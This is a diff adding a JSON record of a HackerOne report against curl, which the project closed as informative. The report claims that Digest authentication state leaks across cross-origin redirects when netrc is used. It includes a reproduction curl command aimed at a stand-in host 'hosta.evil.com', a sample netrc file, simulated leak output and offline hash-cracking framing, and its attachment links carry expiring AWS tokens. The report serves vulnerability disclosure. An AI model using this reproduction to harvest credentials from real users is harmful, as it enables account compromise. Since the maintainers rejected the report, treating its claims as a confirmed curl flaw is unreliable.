@@ -1,0 +1,221 @@
+{
+  "id": 3680038,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjgwMDM4",
+  "url": "https://hackerone.com/reports/3680038",
+  "title": "Digest Auth State Leak on Cross-Origin Redirect via Netrc - Username and Password Hash Sent to Wrong Host",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2026-04-17T12:29:28.458Z",
+  "submitted_at": "2026-04-17T12:29:29.433Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fg0x0",
+    "url": "/fg0x0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/we9mo7ui49vl91bznzyid2bvt1lf/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-27774"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-19T21:50:01.253Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-04-18T21:38:03.246Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nWhen curl follows an HTTP redirect from hostA to hostB using `--netrc --digest -L`, Digest authentication state (nonce, realm) from hostA persists and is combined with hostB's netrc credentials to generate an unsolicited Digest Authorization header sent to hostB. This leaks hostB's username in cleartext and a password hash computed under the attacker's chosen nonce, enabling offline password cracking. The root cause is that Digest state is never cleared on redirect, `authhost->picked` persists as `CURLAUTH_DIGEST`, and `conn->bits.netrc` bypasses `Curl_auth_allowed_to_host()`. This is a variant of CVE-2022-27774 not covered by that fix - NTLM is correctly cleared on new connections (url.c:3373-3378) but Digest is not.\n\n## Affected version\n\n```bash\ncurl 8.20.0-DEV (x86_64-pc-linux-gnu)\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ...\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 ...\n```\n\nTested on current master (commit rc-8_20_0-2), Linux x86_64. Likely affects all versions with `--netrc` + `--digest` + redirect support.\n\n## Steps To Reproduce\n\n  1. Save PoC script as `poc_digest_leak_crossorigin.py` and run it: `python3 poc_digest_leak_crossorigin.py`\n\nThe script starts two HTTP servers (hostA on port 8011, hostB on port 8012), creates a temporary netrc file with credentials for both hosts, and runs curl with `--resolve` to simulate distinct hostnames:\n\n```bash\ncurl --resolve hosta.evil.com:8011:127.0.0.1 \\\n     --resolve hostb.corp.com:8012:127.0.0.1 \\\n     --netrc-file /tmp/test_netrc \\\n     --digest -L \\\n     http://hosta.evil.com:8011/login\n```\n\nNetrc file:\n```\nmachine hosta.evil.com\n  login evil_user\n  password evil_pass\n\nmachine hostb.corp.com\n  login corporate_admin\n  password S3cretP@ssw0rd!\n```\n\n  2. Observe the output - hostB receives an unsolicited Digest Authorization header:\n\n```bash\n[hostA.evil.com] 401 Digest challenge sent\n[hostA.evil.com] Authenticated, redirecting to hostB\n\nVULNERABILITY CONFIRMED: Cross-origin credential leak\nhostB.corp.com received unsolicited Digest auth:\n  Digest username=\"corporate_admin\", realm=\"evil-realm\",\n    nonce=\"attacker_controlled_nonce_abc\", uri=\"/secret\",\n    cnonce=\"b09d5KnvEUHWam89\", nc=00000002, qop=auth,\n    response=\"6e9f04d34189538559a22613f1fe4082\"\n\n  LEAKED: hostB username = corporate_admin\n  STALE:  realm from hostA = evil-realm\n  STALE:  nonce from hostA = attacker_controlled_nonce_abc\n  IMPACT: response hash = MD5(hostB_pass : attacker_nonce : ...)\n```\n\n  3. Run the hash verification PoC to confirm offline cracking: `python3 poc_verify_hash.py`\n\nThis proves that knowing the attacker-chosen nonce + leaked hash is sufficient to brute-force the victim's password offline.\n\n### Root cause (three interacting issues)\n\n**1. Digest state never cleared on redirect** - `data->state.digest` (nonce, realm, cnonce) is only cleaned in `Curl_close()` and `curl_easy_reset()`, never during redirect handling.\n\n**2. `authhost->picked` persists** - Set to `CURLAUTH_DIGEST` during hostA's 401 challenge, never reset on redirect. NTLM is correctly cleared at url.c:3373-3378, but Digest is not.\n\n**3. `conn->bits.netrc` bypasses auth check** - At http.c:842-844:\n```c\nif(Curl_auth_allowed_to_host(data)\n   || conn->bits.netrc)  // bypasses cross-origin check\n  result = output_auth_headers(...);\n```\n\n## Additional information\n\nThis is a variant of CVE-2022-27774 (credential leak on redirect). The fix for that CVE added `Curl_auth_allowed_to_host()`, but the `conn->bits.netrc` exemption at http.c:842 bypasses it for stateful auth methods. NTLM state is correctly cleared on new connections (url.c:3373-3378) but Digest state is not - this asymmetry indicates an oversight.\n\nSuggested fix: Clear Digest state on cross-origin redirect:\n\n```c\n// In redirect handling, after host change detected:\nif(!Curl_url_same_origin(base, href)) {\n  Curl_auth_digest_cleanup(&data->state.digest);\n  data->state.authhost.picked = CURLAUTH_NONE;\n}\n```\n\n## Impact\n\nAn attacker who controls hostA can redirect a curl user to hostB and obtain: (1) hostB's username in cleartext from the unsolicited Digest header, and (2) a Digest response hash computed with the attacker's chosen nonce, enabling offline password cracking if the attacker can observe the request to hostB. This bypasses the credential leak protections added for CVE-2022-27774.",
+  "weakness": {
+    "id": 87,
+    "name": "Insufficiently Protected Credentials"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5752001,
+      "file_name": "poc_digest_leak.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q9yc15zx5w14zh80bi6f43631s0h?response-content-disposition=attachment%3B%20filename%3D%22poc_digest_leak.py%22%3B%20filename%2A%3DUTF-8%27%27poc_digest_leak.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041949Z&X-Amz-Expires=1195&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d010bb39a6b34b2a04400ec4222f91077be555607f261fe7e3015f543b8c539d",
+      "file_size": 5920,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 5752002,
+      "file_name": "poc_libcurl_digest_leak.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mg8yyda3gx37nquuvkxjffofc48i?response-content-disposition=attachment%3B%20filename%3D%22poc_libcurl_digest_leak.c%22%3B%20filename%2A%3DUTF-8%27%27poc_libcurl_digest_leak.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041949Z&X-Amz-Expires=1195&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=688c84865710b13e009ecae6035ee130abce97f43e8b903e37dade2f4ce1ad3d",
+      "file_size": 3855,
+      "type": "text/x-csrc",
+      "moderated": null
+    },
+    {
+      "id": 5752003,
+      "file_name": "poc_digest_leak_crossorigin.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iua3l17qjh2brub6qqvmv7l9z6bd?response-content-disposition=attachment%3B%20filename%3D%22poc_digest_leak_crossorigin.py%22%3B%20filename%2A%3DUTF-8%27%27poc_digest_leak_crossorigin.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041949Z&X-Amz-Expires=1195&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c18b023795043b640b96c1dfea61a04cef2b59c43b5840837a261413f4f434e6",
+      "file_size": 4068,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 5752004,
+      "file_name": "poc_verify_hash.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kp7lyq6h9fgw4d3iv5vxoptbvmyx?response-content-disposition=attachment%3B%20filename%3D%22poc_verify_hash.py%22%3B%20filename%2A%3DUTF-8%27%27poc_verify_hash.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041949Z&X-Amz-Expires=1195&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ee85e286cf50fc9ca64f59a875fc83c784b8392dec1b4dd9166b58b7a351475",
+      "file_size": 2615,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "m2r1",
+    "fg0x0",
+    "2026",
+    "nwicks",
+    "lucius-log",
+    "stranger0001",
+    "nowsh",
+    "angelsvairwaves",
+    "homo_habilis",
+    "r6rosinaldonevesr6",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3680038",
+  "votes": 17,
+  "latest_disclosable_activity_at": "2026-04-19T21:50:00.973Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:19:50.107776",
+    "source": "https://hackerone.com/reports/3680038.json",
+    "report_id": 3680038
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjgwMDM4",
+    "databaseId": "3680038",
+    "title": "Digest Auth State Leak on Cross-Origin Redirect via Netrc - Username and Password Hash Sent to Wrong Host",
+    "url": "https://hackerone.com/reports/3680038",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2026-04-19T21:50:01.253Z",
+    "created_at": "2026-04-17T12:29:28.458Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg3",
+      "name": "Insufficiently Protected Credentials",
+      "external_id": "cwe-522"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "fg0x0"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM2ODAwMzg=",
+    "_id": "3680038",
+    "disclosed": true,
+    "votes": 17,
+    "latest_disclosable_activity_at": "2026-04-19T21:50:00.973Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjgwMDM4",
+      "databaseId": "3680038",
+      "title": "Digest Auth State Leak on Cross-Origin Redirect via Netrc - Username and Password Hash Sent to Wrong Host",
+      "url": "https://hackerone.com/reports/3680038",
+      "disclosed_at": "2026-04-19T21:50:01.253Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
